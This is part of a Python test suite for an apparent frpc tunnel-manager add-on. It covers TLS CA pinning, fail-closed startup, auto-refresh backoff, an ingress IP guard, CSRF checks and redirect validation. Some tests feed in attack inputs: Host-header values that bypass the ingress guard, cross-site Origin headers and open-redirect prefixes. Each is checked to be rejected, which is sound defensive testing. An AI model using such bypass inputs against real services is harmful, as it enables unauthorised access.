        self.assertEqual(status["account_email_masked"], "g***@linumiq.com")
        self.assertEqual((status["tls_warnings"], status["tls_errors"]), ([], []))
        self.assertNotIn("BEGIN CERTIFICATE", json.dumps(status))
        body = self.app.index(get_request()).body.decode()
        self.assertIn("Paired with <strong>g***@linumiq.com</strong>", body)
        self.assertIn("waiting for frpc to log in with it", body)
        self.assertNotIn("certificate verified", body)
        # A login reported for an older configuration does not count.
        self._frpc_log("connected", fingerprint="0" * 64)
        self.assertFalse(self.app.api_status()["tls_verified"])
        self._frpc_log("connecting")
        self.assertEqual(self.app.api_status()["tls_login"], "pending")
        self._frpc_log("connected")
        status = self.app.api_status()
        self.assertEqual((status["tls_verified"], status["tls_login"]), (True, "ok"))
        self.assertTrue(status["frpc_logged_in_at"].endswith("UTC"))
        body = self.app.index(get_request()).body.decode()
        self.assertIn("certificate verified for <code>frps.linumiq.net</code>", body)
        self.assertIn("Test frps CA 1 until 2125-12-31", body)
        self.assertIn("frpc logged in 20", body)
        self.assertNotIn("flash-warn", body)
        self.assertNotIn("flash-error", body)

    def test_old_server_without_ca_is_flagged(self):
        self._paired()
        status = self.app.api_status()
        self.assertEqual((status["tls_mode"], status["account_email_masked"]), ("unverified", ""))
        self.assertEqual(len(status["tls_warnings"]), 1)
        body = self.app.index(get_request()).body.decode()
        self.assertIn("flash-warn", body)
        self.assertIn("certificate not verified", body)
        self.assertIn("did not provide the certificate authority", body)
        self.assertNotIn("trustedCaFile", self.paths.frpc_toml.read_text())

    def test_refresh_keeps_ca_when_server_stops_sending_it(self):
        self._paired(**self._tunnel_v22())
        self.backend[("GET", "/api/device/tunnel")] = (
            200, self._tunnel_v22(server_ca_pem=..., server_name=...))
        resp = self.app.tunnel_refresh(make_request())
        self.assertIn("up+to+date", resp.headers["location"])  # no downgrade, nothing to restart
        self.app._restart_frpc.assert_not_called()
        self.assertIn("trustedCaFile", self.paths.frpc_toml.read_text())
        status = self.app.api_status()
        self.assertEqual(status["tls_mode"], "verified")
        self.assertTrue(any("no longer sends" in w for w in status["tls_warnings"]))
        # An invalid CA neither replaces nor removes the pinned one.
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel_v22(server_ca_pem="garbage"))
        self.app.tunnel_refresh(make_request())
        self.assertEqual(self.paths.frps_ca.read_text(), CA1)
        self.assertTrue(any("invalid certificate authority" in w for w in self.app.api_status()["tls_warnings"]))
        # A new valid CA (rotation) replaces it and restarts frpc.
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel_v22(server_ca_pem=CA2 + CA1))
        resp = self.app.tunnel_refresh(make_request())
        self.assertIn("updated", resp.headers["location"])
        self.app._restart_frpc.assert_called_once()
        self.assertEqual(self.paths.frps_ca.read_text(), CA2 + CA1)
        self.assertEqual(self.app.api_status()["tls_warnings"], [])

    def test_verify_server_false_is_explicit_and_visible(self):
        self._paired(**self._tunnel_v22())
        with mock.patch.object(self.app, "OPTIONS", self.cfg.parse_options({"verify_server": False})):
            self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel_v22())
            self.app.tunnel_refresh(make_request())
            self.assertNotIn("trustedCaFile", self.paths.frpc_toml.read_text())
            self.assertFalse(self.paths.frps_ca.exists())
            status = self.app.api_status()
            self.assertEqual(status["tls_mode"], "disabled")
            self.assertTrue(any("verify_server" in w for w in status["tls_warnings"]))

    def test_expired_ca_is_an_error(self):
        self._paired(**self._tunnel_v22(server_ca_pem=EXPIRED_CA))
        self.assertTrue(any("has expired or is not yet valid" in e for e in self.app.api_status()["tls_errors"]))
        # One current CA in the bundle: only a warning.
        self._paired(**self._tunnel_v22(server_ca_pem=EXPIRED_CA + CA1))
        status = self.app.api_status()
        self.assertEqual(status["tls_errors"], [])
        self.assertTrue(any("expired or is not yet valid" in w for w in status["tls_warnings"]))

    # -- fail closed (L-9) / login state (L-10) ----------------------------------

    def test_unusable_ca_fails_closed_with_a_red_banner(self):
        self._paired(**self._tunnel_v22())
        self._frpc_log("connected")
        # The state's CA no longer validates and no valid copy exists.
        state = self._state()
        state["server_ca_pem"] = V1_ROOT
        self.cfg.write_json(self.paths.state, state)
        self.paths.frps_ca.write_text("garbage")
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel_v22(server_ca_pem="garbage"))
        with self.assertRaises(self.app.FlashError) as ctx:
            self.app.tunnel_refresh(make_request())
        self.assertIn("never falls back", ctx.exception.message)
        self.assertFalse(self.paths.frpc_toml.exists())  # the run script refuses to start frpc
        self.assertFalse(self.paths.frps_ca.exists())
        self.app._restart_frpc.assert_called_once()     # a running frpc is taken down
        status = self.app.api_status()
        self.assertEqual((status["tls_mode"], status["tls_verified"]), ("blocked", False))
        self.assertTrue(any("never falls back" in e for e in status["tls_errors"]))
        body = self.app.index(get_request()).body.decode()
        self.assertIn("flash-error", body)
        self.assertIn("frpc not started: no valid CA", body)
        # A valid CA from the server recovers.
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel_v22(server_ca_pem=CA2))
        resp = self.app.tunnel_refresh(make_request())
        self.assertIn("updated", resp.headers["location"])
        self.assertEqual(self.paths.frps_ca.read_text(), CA2)
        self.assertEqual(self.app.api_status()["tls_mode"], "verified")

    def test_first_pairing_with_an_invalid_ca_never_runs_unverified(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel_v22(server_ca_pem=V1_ROOT))
        self.assertEqual(self.app.pair_poll()["status"], "paired")
        self.assertFalse(self.paths.frpc_toml.exists())
        status = self.app.api_status()
        self.assertEqual(status["tls_mode"], "blocked")
        self.assertTrue(status["tls_errors"])
        # Same for a subdomain change: an error, frpc stays down.
        self.backend[("POST", "/api/device/tunnel")] = (
            200, self._tunnel_v22(subdomain="other", server_ca_pem="still invalid"))
        with self.assertRaises(self.app.FlashError) as ctx:
            self.app.subdomain_change(make_request(), subdomain="other")
        self.assertIn("never falls back", ctx.exception.message)
        self.assertFalse(self.paths.frpc_toml.exists())

    def test_invalid_state_ca_falls_back_to_the_last_valid_one(self):
        self._paired(**self._tunnel_v22())
        state = self._state()
        state["server_ca_pem"] = V1_ROOT  # accepted by older validators, not by this one
        self.cfg.write_json(self.paths.state, state)
        status = self.app.api_status()
        self.assertEqual(status["tls_mode"], "verified")
        self.assertTrue(any("last valid one" in w for w in status["tls_warnings"]))
        self.assertEqual(status["tls_errors"], [])

    def test_login_failures_are_shown_without_secrets(self):
        self._paired(**self._tunnel_v22())
        self._frpc_log("failed", login_failures=2,
                       last_error=f"x509: certificate signed by unknown authority {TOKEN}")
        status = self.app.api_status()
        self.assertEqual((status["tls_login"], status["tls_verified"]), ("failed", False))
        self.assertEqual(len(status["tls_errors"]), 1)
        self.assertIn("unknown authority", status["tls_errors"][0])
        self.assertNotIn(TOKEN, json.dumps(status))
        self.assertIn("login with the CA pinned", self.app.index(get_request()).body.decode())
        # Still failed while frpc is between two attempts ("connecting").
        self._frpc_log("connecting", login_failures=2)
        self.assertEqual(self.app.api_status()["tls_login"], "failed")
        self._frpc_log("failed", network_failures=4, last_error="dial tcp: connection refused")
        status = self.app.api_status()
        self.assertEqual((status["tls_login"], status["tls_errors"]), ("unreachable", []))
        self.assertTrue(any("cannot reach" in w for w in status["tls_warnings"]))

    # -- automatic refresh (L-6) --------------------------------------------------

    def test_auto_refresh_schedule(self):
        app = self.app
        lo, hi = app.AUTO_REFRESH_INTERVAL
        first = app.LOGIN_FAILURE_BACKOFF[0]
        threshold = app.LOGIN_FAILURE_THRESHOLD
        schedule = app.AutoRefresh(0.0, random.Random(7))
        self.assertEqual(schedule.due(0.0, 0), "startup")
        schedule.done("startup", 0.0, "unchanged")
        self.assertTrue(lo <= schedule.next_periodic <= hi)
        self.assertIsNone(schedule.due(lo - 1, 0))
        self.assertEqual(schedule.due(schedule.next_periodic, 0), "periodic")
        # Jitter: different instances pick different times.
        times = set()
        for seed in range(5):
            other = app.AutoRefresh(0.0, random.Random(seed))
            other.done("startup", 0.0, "unchanged")
            times.add(other.next_periodic)
        self.assertEqual(len(times), 5)
        # Login failures: threshold, first backoff counted from the start-up.
        self.assertIsNone(schedule.due(first - 1, 99))
        self.assertIsNone(schedule.due(first, threshold - 1))
        self.assertEqual(schedule.due(first, threshold), "login-failures")
        schedule.done("login-failures", first, "unchanged")
        self.assertIsNone(schedule.due(2 * first - 1, threshold))
        self.assertEqual(schedule.due(2 * first, threshold), "login-failures")
        schedule.done("login-failures", 2 * first, "unchanged")
        self.assertIsNone(schedule.due(4 * first - 1, threshold))   # doubled
        self.assertEqual(schedule.due(4 * first, threshold), "login-failures")
        for _ in range(20):
            schedule.done("login-failures", 0.0, "unchanged")
        self.assertEqual(schedule.backoff, app.LOGIN_FAILURE_BACKOFF[1])  # capped
        schedule.logged_in()
        self.assertEqual(schedule.backoff, first)
        # A failed refresh (backend unreachable) is retried after an hour.
        schedule.done("periodic", 100.0, "error")
        self.assertEqual(schedule.next_periodic, 100.0 + app.AUTO_REFRESH_RETRY)

    def test_auto_refresh_applies_changes_like_a_manual_refresh(self):
        self._paired()
        schedule = self.app.AutoRefresh(0.0, random.Random(1))
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel(server_port=7000))
        self.assertEqual(self.app._auto_refresh_tick(schedule, 0.0), "updated")  # start-up
        self.app._restart_frpc.assert_called_once()
        self.assertIn("serverPort = 7000", self.paths.frpc_toml.read_text())
        self.assertEqual(self.calls[-1][3], DEVICE_TOKEN)
        auto = self.app.api_status()["auto_refresh"]
        self.assertEqual((auto["reason"], auto["outcome"]), ("startup", "updated"))
        self.assertIsNone(self.app._auto_refresh_tick(schedule, 60.0))  # nothing due
        self.assertEqual(self.app._auto_refresh_tick(schedule, schedule.next_periodic), "unchanged")
        self.assertEqual(len([c for c in self.calls if c[:2] == ("GET", "/api/device/tunnel")]), 2)
        self.assertIn("Config refresh", self.app.index(get_request()).body.decode())

    def test_auto_refresh_after_repeated_login_failures(self):
        self._paired(**self._tunnel_v22())
        schedule = self.app.AutoRefresh(0.0, random.Random(1))
        schedule.done("startup", 0.0, "unchanged")
        first = self.app.LOGIN_FAILURE_BACKOFF[0]
        self._frpc_log("connecting", login_failures=self.app.LOGIN_FAILURE_THRESHOLD,
                       last_error="x509: certificate signed by unknown authority")
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel_v22(server_ca_pem=CA2))  # rotated
        self.assertIsNone(self.app._auto_refresh_tick(schedule, first - 1))
        self.assertEqual(self.app._auto_refresh_tick(schedule, first), "updated")
        self.assertEqual(self.paths.frps_ca.read_text(), CA2)
        self.app._restart_frpc.assert_called_once()
        # The failures were reported for the old configuration: ignored now.
        self.assertIsNone(self.app._auto_refresh_tick(schedule, 100 * first))
        # Network errors (frps down) never trigger it.
        self._frpc_log("failed", network_failures=50, last_error="connection refused")
        self.assertIsNone(self.app._auto_refresh_tick(schedule, 100 * first))

    def test_auto_refresh_never_raises(self):
        schedule = self.app.AutoRefresh(0.0, random.Random(1))
        self.assertEqual(self.app._auto_refresh_tick(schedule, 0.0), "skipped")  # not paired
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = self.app.BackendUnavailable("down")
        self.assertEqual(self.app._auto_refresh_tick(schedule, schedule.next_periodic), "error")
        self.backend[("GET", "/api/device/tunnel")] = (401, {"error": "unauthorized"})
        self.assertEqual(self.app._auto_refresh_tick(schedule, schedule.next_periodic), "unauthorized")
        self.assertTrue(self.paths.frpc_toml.exists())

    # -- ingress guard / CSRF (ASGI level, as uvicorn drives the app) ----------

    def test_default_allow_list_is_the_ingress_proxy_only(self):
        # L-8: loopback is not allowed by default - the unprivileged frpc
        # user must not be able to drive the panel via 127.0.0.1.
        self.assertEqual(self.app.DEFAULT_ALLOWED_INGRESS_IPS, "172.30.32.2")
        self._paired()
        self.backend[("DELETE", "/api/device/tunnel")] = (200, {"ok": True})
        for client in (("127.0.0.1", 40000), ("::1", 40000), ("172.30.32.1", 1), ("172.30.33.2", 1)):
            with self.subTest(client=client):
                self.assertEqual(asgi_call(self.app.app, "GET", "/api/status", client=client)[0], 403)
                self.assertEqual(asgi_call(self.app.app, "POST", "/unpair", SAME_ORIGIN, client=client)[0], 403)
        self.assertTrue(self.paths.state.exists())
        self.assertEqual(asgi_call(self.app.app, "GET", "/api/status")[0], 200)  # from INGRESS
        # Loopback only when explicitly configured (E2E harness, smoke test).
        with mock.patch.object(self.app, "ALLOWED_CLIENT_NETS", self.app._parse_allowed_clients("127.0.0.1")):
            self.assertEqual(asgi_call(self.app.app, "GET", "/api/status", client=("127.0.0.1", 1))[0], 200)

    def test_health_has_no_ingress_exemption(self):
        self.assertEqual(asgi_call(self.app.app, "GET", "/_health")[:1], (200,))
        status, _, body = asgi_call(self.app.app, "GET", "/_health", client=("10.1.2.3", 4000))
        self.assertEqual((status, body), (403, b"Forbidden: frp-mgr is only reachable via Home Assistant ingress."))

    def test_crafted_host_header_cannot_bypass_the_ingress_guard(self):
        # GHSA-86qp-5c8j-p5mr: Starlette rebuilt request.url from Host, so
        # "Host: x/_health?" made request.url.path == "/_health" for POST /unpair.
        self._paired()
        self.backend[("DELETE", "/api/device/tunnel")] = (200, {"ok": True})
        for host in ("x/_health?a=", "x/_health#", "x/static/app.css?", "127.0.0.1"):
            for client in (("10.1.2.3", 4000), ("172.30.32.3", 1), ("", 0), None):
                with self.subTest(host=host, client=client):
                    status, _, _ = asgi_call(self.app.app, "POST", "/unpair", SAME_ORIGIN,
                                             client=client, host=host)
                    self.assertEqual(status, 403)
        self.assertTrue(self.paths.state.exists())
        self.assertEqual(self.calls, [])
        # Static files are behind the guard too.
        self.assertEqual(asgi_call(self.app.app, "GET", "/static/app.css", client=("10.1.2.3", 1))[0], 403)
        self.assertEqual(asgi_call(self.app.app, "GET", "/static/app.css")[0], 200)
        self.assertEqual(asgi_call(self.app.app, "GET", "/static/shared/fonts/inter-latin.woff2",
                                   client=("10.1.2.3", 1))[0], 403)

    def test_post_requires_same_origin(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel())
        cases = [
            ([], 403),
            ([("Sec-Fetch-Site", "cross-site")], 403),
            ([("Sec-Fetch-Site", "same-site")], 403),
            ([("Sec-Fetch-Site", "none")], 403),
            ([("Sec-Fetch-Site", "cross-site"), ("Origin", "http://panel.test")], 403),
            ([("Origin", "null")], 403),
            ([("Origin", "https://evil.example")], 403),
            ([("Origin", "http://panel.test.evil.example")], 403),
            ([("Origin", "javascript:x")], 403),
            ([("Sec-Fetch-Site", "same-origin")], 303),
            ([("Sec-Fetch-Site", "Same-Origin")], 303),
            ([("Origin", "http://panel.test")], 303),       # browsers without Fetch Metadata
            ([("Origin", "https://PANEL.test")], 303),
        ]
        for headers, expected in cases:
            with self.subTest(headers=headers):
                status, resp_headers, _ = asgi_call(self.app.app, "POST", "/tunnel/refresh", headers)
                self.assertEqual(status, expected)
                if expected == 303:
                    self.assertIn("ok=", resp_headers["location"])
        # Every state-changing route is covered (not only /tunnel/refresh).
        for path in ("/pair/start", "/pair/poll", "/subdomain/change", "/unpair"):
            with self.subTest(path=path):
                self.assertEqual(asgi_call(self.app.app, "POST", path)[0], 403)
        self.assertTrue(self.paths.state.exists())
        # Reads need no Fetch Metadata.
        status, _, body = asgi_call(self.app.app, "GET", "/api/status")
        self.assertEqual(status, 200)
        self.assertTrue(json.loads(body)["paired"])

    def test_poll_and_form_endpoints_over_asgi(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (400, {"error": "authorization_pending"})
        status, headers, body = asgi_call(self.app.app, "POST", "/pair/poll", SAME_ORIGIN)
        self.assertEqual((status, json.loads(body)), (200, {"status": "pending"}))
        self.assertTrue(headers["content-type"].startswith("application/json"))
        self.paths.pairing.unlink()
        self._paired()
        self.backend[("POST", "/api/device/tunnel")] = (200, self._tunnel(subdomain="newhome", token="d" * 64))
        form = urlencode({"subdomain": "NewHome"}).encode()
        status, headers, _ = asgi_call(
            self.app.app, "POST", "/subdomain/change",
            SAME_ORIGIN + [("Content-Type", "application/x-www-form-urlencoded"),
                           ("X-Ingress-Path", "/api/hassio_ingress/tok-EN_1")], body=form)
        self.assertEqual(status, 303)
        self.assertTrue(headers["location"].startswith("/api/hassio_ingress/tok-EN_1/?ok="))
        self.assertEqual(self.calls[-1][2], {"subdomain": "newhome"})
        # A missing field is a normal validation error, not a crash.
        status, headers, _ = asgi_call(self.app.app, "POST", "/subdomain/change", SAME_ORIGIN)
        self.assertEqual(status, 303)
        self.assertIn("error=Subdomain+is+required", headers["location"])

    def test_invalid_ingress_path_is_never_used_for_redirects(self):
        for prefix in ("//evil.example", "https://evil.example", "/a/../b", "/x\\y", "/x y", "/a//b"):
            with self.subTest(prefix=prefix):
                resp = self.app._redirect_home(make_request([("X-Ingress-Path", prefix)]), ok="x")
                self.assertEqual(resp.headers["location"], "/?ok=x")
        resp = self.app._redirect_home(make_request([("X-Ingress-Path", "/api/hassio_ingress/abc/")]))
        self.assertEqual(resp.headers["location"], "/api/hassio_ingress/abc/")

    def test_doubled_leading_slash_is_collapsed(self):
        status, _, body = asgi_call(self.app.app, "GET", "//api/status")
        self.assertEqual(status, 200)
        self.assertIn(b'"paired"', body)

    def test_ingress_allow_list(self):
        nets = self.app._parse_allowed_clients("172.30.32.2, 127.0.0.1,10.89.0.0/24,bogus")
        with mock.patch.object(self.app, "ALLOWED_CLIENT_NETS", nets):
            self.assertTrue(self.app._client_allowed("172.30.32.2"))
            self.assertTrue(self.app._client_allowed("10.89.0.7"))
            self.assertFalse(self.app._client_allowed("172.30.32.3"))
            self.assertFalse(self.app._client_allowed(""))
        with mock.patch.object(self.app, "ALLOWED_CLIENT_NETS", self.app._parse_allowed_clients("fe80::/64")):
            self.assertTrue(self.app._client_allowed("fe80::1"))
            self.assertFalse(self.app._client_allowed("fe80::1%eth0"))


if __name__ == "__main__":
    unittest.main()
